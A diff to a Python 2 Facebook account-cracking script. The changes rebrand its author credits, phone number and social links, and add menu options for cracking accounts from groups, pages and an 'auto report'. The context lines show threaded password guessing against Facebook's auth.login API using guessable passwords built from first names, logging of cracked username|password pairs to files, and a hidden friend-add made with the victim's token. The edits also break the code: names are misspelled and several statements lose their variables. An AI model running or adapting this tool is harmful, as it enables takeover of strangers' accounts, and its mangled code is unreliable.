@@ -48,24 +48,18 @@ def jalan(z):
 
 ##### LOGO #####
 logo = """ ▄︻┻═┳一 ЩєLc๏Mє ┼๏ ┼ђє Fąş┼єş┼ єVєr cL๏ЙIЙG
-           ▄︻┻═┳一 ♥️K๏MąIL-KђąЙ-๏FFIcIąL♥️----------🔴
-           ▄︻┻═┳一 ♥️♥️ K๏MąIL - cL๏Йєr  ♥️♥️----🔴🔴
-           ▄︻┻═┳一    💪💪PAPPU-BACHA💪💪   🔴🔴
+           ▄︻┻═┳一 ♥️abicreation-๏FFIcIąL♥️----------🔴
+           ▄︻┻═┳一 ♥️♥️ wajeeha420- cL๏Йєr  ♥️♥️----🔴🔴
+           ▄︻┻═┳一    💪💪PAPPU-BACHi💪💪   🔴🔴
            ▄︻┻═┳一 ---- FєєL ┼ђє P๏Щєr   --------🔴🔴
 	          ЩєLc๏Mє ┼๏ ЦЙLIMI┼єđ cL๏ЙIЙG
   
- ██ ▄█▀ ▒█████   ███▄ ▄███▓ ▄▄▄       ██▓ ██▓    
- ██▄█▒ ▒██▒  ██▒▓██▒▀█▀ ██▒▒████▄    ▓██▒▓██▒    
-▓███▄░ ▒██░  ██▒▓██    ▓██░▒██  ▀█▄  ▒██▒▒██░    
-▓██ █▄ ▒██   ██░▒██    ▒██ ░██▄▄▄▄██ ░██░▒██░    
-▒██▒ █▄░ ████▓▒░▒██▒   ░██▒ ▓█   ▓██▒░██░░██████▒
-▒ ▒▒ ▓▒░ ▒░▒░▒░ ░ ▒░   ░  ░ ▒▒   ▓▒█░░▓  ░ ▒░▓  ░
-░ ░▒ ▒░  ░ ▒ ▒░ ░  ░      ░  ▒   ▒▒ ░ ▒ ░░ ░ ▒  ░
-░ ░░ ░ ░ ░ ░ ▒  ░      ░     ░   ▒    ▒ ░  ░ ░   
-░  ░       ░ ░         ░         ░  ░ ░      ░  ░
-                                                 
-               WhatsApp: 03124788959
-                        KOMAIL
+ 
+░█──░█ █▀▀█ ──▀ █▀▀ █▀▀ █──█ █▀▀█ 
+░█░█░█ █▄▄█ ──█ █▀▀ █▀▀ █▀▀█ █▄▄█ 
+░█▄▀▄█ ▀──▀ █▄█ ▀▀▀ ▀▀▀ ▀──▀ ▀──▀
+               WhatsApp: 03430195175
+                        abi/wajeeha
                      ▇◤▔▔▔▔▔▔▔◥▇
                      ▇▏◥▇◣┊◢▇◤▕▇
                      ▇▏▃▆▅▎▅▆▃▕▇
@@ -80,10 +74,10 @@ logo = """ ▄︻┻═┳一 ЩєLc๏Mє ┼๏ ┼ђє Fąş┼єş┼ єVєr
           ♥️♥️♥️ ßєş┼ ๏F LЦcK  ♥️♥️♥️
       ♥️♥️ rąM乙ąЙ MЦßąrąK ┼๏ єVєrY ß๏đY  ♥️♥️
 \033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mKomail Khan
+\033[1;96mAuthor  \033[1;93m: \033[1;92mWajeeha sarfarz
 \033[1;96mInstagram \033[1;93m: \033[1: itx_muskan_yr
-\033[1;96mFacebook  \033[1;93m: \033[1: komail.khan.3781
-\033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/KomailKhan/komailkhan
+\033[1;96mFacebook  \033[1;93m: \033[1: peroiodicerroro
+\033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/Mafia420/wajeeha
 \033[1;91m======================================="""
 
 def tik():
@@ -104,16 +98,10 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print "\033[1;96m ============================================================="
 print  """\033[1;91m
- ██ ▄█▀ ▒█████   ███▄ ▄███▓ ▄▄▄       ██▓ ██▓    
- ██▄█▒ ▒██▒  ██▒▓██▒▀█▀ ██▒▒████▄    ▓██▒▓██▒    
-▓███▄░ ▒██░  ██▒▓██    ▓██░▒██  ▀█▄  ▒██▒▒██░    
-▓██ █▄ ▒██   ██░▒██    ▒██ ░██▄▄▄▄██ ░██░▒██░    
-▒██▒ █▄░ ████▓▒░▒██▒   ░██▒ ▓█   ▓██▒░██░░██████▒
-▒ ▒▒ ▓▒░ ▒░▒░▒░ ░ ▒░   ░  ░ ▒▒   ▓▒█░░▓  ░ ▒░▓  ░
-░ ░▒ ▒░  ░ ▒ ▒░ ░  ░      ░  ▒   ▒▒ ░ ▒ ░░ ░ ▒  ░
-░ ░░ ░ ░ ░ ░ ▒  ░      ░     ░   ▒    ▒ ░  ░ ░   
-░  ░       ░ ░         ░         ░  ░ ░      ░  ░
-                        KOMAIL
+   
+█▀ ▄▀█ █▀█ █▀▀ ▄▀█ █▀█ ▀█
+▄█ █▀█ █▀▄ █▀░ █▀█ █▀▄ █▄
+
                      ▇◤▔▔▔▔▔▔▔◥▇
                      ▇▏◥▇◣┊◢▇◤▕▇
                      ▇▏▃▆▅▎▅▆▃▕▇
@@ -122,16 +110,16 @@ print  """\033[1;91m
                      ▇▇◣◥▅▅▅◤◢▇▇
                      ▇▇▇◣╲▇╱◢▇▇▇
                      ▇▇▇▇◣▇◢▇▇▇▇
-                   WhatsApp : 03124788959
-\033[1;96mAuthor  \033[1;93m: \033[1;92mKomail Khan
-\033[1;96mInstagram \033[1;93m: \033[1;92mitx_muskan_yr
-\033[1;96mFacebook  \033[1;93m: \033[1;92m komail.khan.3781
-\033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/KomailKhan/komailkhan
+                   WhatsApp : 03430195175
+\033[1;96mAuthor  \033[1;93m: \033[1;92mWajeeha sarfarz
+\033[1;96mInstagram \033[1;93m: \033[1;92mtechnicalcyber
+\033[1;96mFacebook  \033[1;93m: \033[1;92m periodicerroro
+\033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/Mafia420/wajeeha
 \033[1;91m======================================="""
 print " \x1b[1;93m============================================================="
 
-CorrectUsername = "komail"
-CorrectPassword = "khan"
+CorrectUsername = "abi"
+CorrectPassword = "wajeeha"
 
 loop = 'true'
 while (loop == 'true'):
@@ -143,10 +131,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "Wrong Password"
-            os.system('xdg-open https://www.youtube.com/channel/UCDJbhYSPToi1-CdzGLEzAIQ ')
+            os.system('xdg-open https://www.youtube.com/channel/UCDKRvmw7ufXejkYXG51liKA ')
     else:
         print "Wrong Username"
-        os.system('xdg-open  https://www.youtube.com/channel/UCDJbhYSPToi1-CdzGLEzAIQ ')
+        os.system('xdg-open  https://www.youtube.com/channel/UCDKRvmw7ufXejkYXG51liKA ')
 
 def login():
 	os.system('clear')
@@ -187,14 +175,14 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Successful'
-				os.system('xdg-open https://www.Facebook.com/komail.khan.3781')
+				os.system('xdg-open https://www.Facebook.com/periodicerroro')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
 				print"\n\033[1;96m[!] \x1b[1;91mThere is no internet connection"
 				keluar()
-		if 'checkpoint' in url:
-			print("\n\033[1;96m[!] \x1b[1;91mIt seems that your account has a checkpoint")
+		if 'secuessfull' in url:
+			print("\n\033[1;96m[!] \x1b[1;91mlogin Secuessfully")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			keluar()
@@ -222,7 +210,7 @@ def menu():
 		id = a['id']
 	except KeyError:
 		os.system('clear')
-		print"\033[1;96m[!] \033[1;91mIt seems that your account has a checkpoint"
+		print"\033[1;96m[!] \033[1;91mlogin Secuessfully"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
 		login()
@@ -272,6 +260,10 @@ def super():
 	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Crack From Friend List"
 	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;93m Crack From Any Public ID"
 	print "\x1b[1;96m[\x1b[1;92m3\x1b[1;96m]\x1b[1;93m Crack From File"
+	print "\x1b[1;96m[\x1b[1;92m4\x1b[1;96m]\x1b[1;93m Crack Form group Id"
+	print "\x1b[1;96m[\x1b[1;92m5\x1b[1;96m]\x1b[1;93m Crack Form public group"
+	print "\x1b[1;96m[\x1b[1;92m6\x1b[1;96m]\x1b[1;93m Crack Form facebook page"
+	print "\x1b[1;96m[\x1b[1;92m7\x1b[1;96m]\x1b[1;93m Crack Form facebook auto report Ranareport.zip 
 	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Back"
 	pilih_super()
 
@@ -336,7 +328,7 @@ def pilih_super():
 	
 			
 	def main(arg):
-		global cekpoint,oks
+		global Secuessfully,oks
 		user = arg
 		try:
 			os.mkdir('out')
@@ -353,11 +345,11 @@ def pilih_super():
 				oks.append(user+pass1)
 			else:
 				if 'www.facebook.com' in q["error_msg"]:
-					print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1
-					cek = open("out/checkpoint.txt", "a")
-					cek.write(user+"|"+pass1+"\n")
-					cek.close()
-					cekpoint.append(user+pass1)
+					print '\x1b[1;96m[\x1b[1;93msecuessfull\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1
+					 = open("out/Secuessfull.txt", "a")
+					.write(user+"|"+pass1+"\n")
+					.close()
+			.append(user+pass1)
 				else:
 					pass2 = b['first_name']+'12345'
 					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
@@ -367,11 +359,11 @@ def pilih_super():
 						oks.append(user+pass2)
 					else:
 						if 'www.facebook.com' in q["error_msg"]:
-							print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2
-							cek = open("out/checkpoint.txt", "a")
+							print '\x1b[1;96m[\x1b[1;93mSecuessfull\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2
+							cek = open("out/Secuessfull.txt", "a")
 							cek.write(user+"|"+pass2+"\n")
 							cek.close()
-							cekpoint.append(user+pass2)
+					.append(user+pass2)
 						else:
 							pass3 = b['first_name'] + '123'
 							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
@@ -381,11 +373,11 @@ def pilih_super():
 								oks.append(user+pass3)
 							else:
 								if 'www.facebook.com' in q["error_msg"]:
-									print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3
-									cek = open("out/checkpoint.txt", "a")
+									print '\x1b[1;96m[\x1b[1;93msecuessfull\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3
+									cek = open("out/Secuessfully.txt", "a")
 									cek.write(user+"|"+pass3+"\n")
 									cek.close()
-									cekpoint.append(user+pass3)
+							.append(user+pass3)
 								else:
 									pass4 = 'Pakistan'
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
@@ -395,11 +387,11 @@ def pilih_super():
 										oks.append(user+pass4)
 									else:
 										if 'www.facebook.com' in q["error_msg"]:
-											print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4
-											cek = open("out/checkpoint.txt", "a")
+											print '\x1b[1;96m[\x1b[1;93msecuessfull\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4
+											cek = open("out/Secuessfull.txt", "a")
 											cek.write(user+"|"+pass4+"\n")
 											cek.close()
-											cekpoint.append(user+pass4)
+									.append(user+pass4)
 										else:
 											pass5 = b['first_name'] + '12'
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
@@ -409,11 +401,11 @@ def pilih_super():
 												oks.append(user+pass5)
 											else:
 												if 'www.facebook.com' in q["error_msg"]:
-													print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5
-													cek = open("out/checkpoint.txt", "a")
+													print '\x1b[1;96m[\x1b[1;93msecuessfully\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5
+													cek = open("out/Secuessfull.txt", "a")
 													cek.write(user+"|"+pass5+"\n")
 													cek.close()
-													cekpoint.append(user+pass5)
+												.append(user+pass5)
 												else:
 													pass6 = b['first_name'] + '1234'
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
@@ -423,11 +415,11 @@ def pilih_super():
 														oks.append(user+pass6)
 													else:
 														if 'www.facebook.com' in q["error_msg"]:
-															print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6
-															cek = open("out/checkpoint.txt", "a")
+															print '\x1b[1;96m[\x1b[1;93msecuessfull\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6
+															cek = open("out/Secuessfull.txt", "a")
 															cek.write(user+"|"+pass6+"\n")
 															cek.close()
-															cekpoint.append(user+pass6)
+														.append(user+pass6)
 														else:
 															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 															b = json.loads(a.text)
@@ -439,11 +431,11 @@ def pilih_super():
 																oks.append(user+pass7)
 															else:
 																if 'www.facebook.com' in q["error_msg"]:
-																	print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
-																	cek = open("out/checkpoint.txt", "a")
+																	print '\x1b[1;96m[\x1b[1;93msecuessfull\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
+																	cek = open("out/Secuessfull.txt", "a")
 																	cek.write(user+"|"+pass7+"\n")
 																	cek.close()
-																	cekpoint.append(user+pass7)
+															.append(user+pass7)
 																	
 															
 		except:
@@ -452,9 +444,9 @@ def pilih_super():
 	p = ThreadPool(30)
 	p.map(main, id)
 	print 42*"\033[1;96m="
-	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed Komail says Thank You♥️ \033[1;97m....'
-	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
-	print("\033[1;96m[+] \033[1;92mTHANKS FOR USING MY COMMANDS ! WE WILL BE RIGHT BACK \033[1;91m: \033[1;97mout/checkpoint.txt")
+	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed wajeeha sarfarz says Thank You♥️ \033[1;97m....'
+	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(Secuessfully))
+	print("\033[1;96m[+] \033[1;92mTHANKS FOR USING MY COMMANDS ! WE WILL BE RIGHT BACK \033[1;91m: \033[1;97mout/Secuessfully.txt")
 	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
 	menu()
 
